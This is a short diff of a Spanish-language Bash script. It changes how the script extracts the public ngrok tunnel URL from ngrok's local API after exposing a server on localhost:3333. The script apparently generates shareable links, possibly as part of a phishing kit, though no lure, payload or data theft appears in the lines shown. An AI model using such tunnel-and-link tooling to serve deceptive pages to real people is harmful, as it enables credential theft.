@@ -547,7 +547,7 @@ echo -e "$v[*]$b Abriendo servidor ngrok..."
 sleep 7
 echo -e "$v[*]$b Obteniendo links..."
 sleep 5
-envialink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+envialink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://.*.ngrok.io" | cut -d '"' -f2)
 echo -e "$v[*]$b localhost:3333"
 if [[ $envialink == "" ]];then
 echo -e "$r[!]$b No se puedo conectar prueba otro servidor"
